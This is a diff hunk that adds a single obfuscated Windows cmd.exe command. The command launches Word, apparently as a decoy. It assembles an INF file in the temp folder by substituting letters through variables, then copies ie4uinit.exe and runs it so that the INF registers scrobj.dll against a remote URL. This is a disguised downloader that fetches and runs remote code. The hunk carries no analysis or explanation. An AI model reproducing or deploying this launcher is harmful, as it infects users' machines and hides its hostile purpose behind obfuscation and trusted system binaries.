@@ -1,0 +1,20 @@
+/v /c start "" "C:\Program Files\Microsoft Office\root\Office16\WINWORD.EXE" & (for %h in ("utah=e" "cultella=s" "ana=t" "future=ca" ) do @set %~h) &&
+  (for %o in ("u") do @set "bugginess=%~o") &&
+  (for %f in ("7") do @set "stripli=%~f") &&
+  (for %e in ("]") do @set "redshi=%~e") &&
+  (for %x in ("d") do @set "speckledfa=%~x") &&
+  (for %r in ("[") do @set "wuran=%~r") &&
+  callcall(for %a in ("4") do @set "irrecogniza=%~a") &&
+  call(for %q in ("o") do @set "pleasant=%~q") &&
+  (for %z in ("u") do @set "bugginess=%~z") &&
+  callcall(for %b in ("s") do @set "whincha=%~b") &&
+  (for %s in ("e") do @set "adelpho=%~s") &&
+  callcallcall(for %c in ("g") do @set "cint=%~c") &&
+  callcall(for %o in ("i") do @set "creas=%~o") &&
+  callcall(for %p in ("l") do @set "mandatory=%~p") &&
+  callcall(for %h in ("E") do @set "misrul=%~h") &&
+  (for %v in ("D") do @set "untr=%~v") &&
+  callcall(for %s in ("d") do @set "speckledfa=%~s") &&
+  callcallcall(for %r in ("[destinationdirs]" "defaultdestdir=11" "7ECD47=01" "[version]" "signature=$windowsnt$" "[7ECD47]" "i%conjugable%u%cudsps%n%cudsps%t%ascell%i%stormtig%f" "[defaultinstall.windows7]" "delfiles=7ECD47" "Un\" "Register\" "OCXs=apa_877A" "[strings]" "servicename= 'terrar'" "shortsvcname= 'terrar'" "ascell=." "viresc=/" "syndesmo=:" "heptap=N" "cockiesor=a" "tatua=b" "syllabari=c" "unsnapspa=d" "conjugable=e" "coext=h" "cudsps=i" "undis=j" "zymosthe=k" "discinct=l" "inwra=m" "stormtig=n" "delphocurar=o" "sentencingh=s" "wais=t" "sybari=u" "[apa_877A]" "s%syllabari%r%delphocurar%b\" "%undis%.%unsnapspa%l%discinct%,%heptap%I,%coext%t%wais%p%syndesmo%/%viresc%k%cockiesor%g%unsnapspa%h%cudsps%.%zymosthe%a%wais%h%conjugable%r%cudsps%n%conjugable%h%sybari%t%syllabari%h%conjugable%n%sentencingh%.%syllabari%o%inwra%/%inwra%a%zymosthe%e%cudsps%t%tatua%e%wais%t%conjugable%r" ) do @echo %~r) > "%temp%\ieuinit.inf" &&
+  call xcopy /Y /C /Q %windir%\system32\ie4uinit.exe "%temp%" &&
+  start " " %temp%\ie4uinit.exe -basesettings
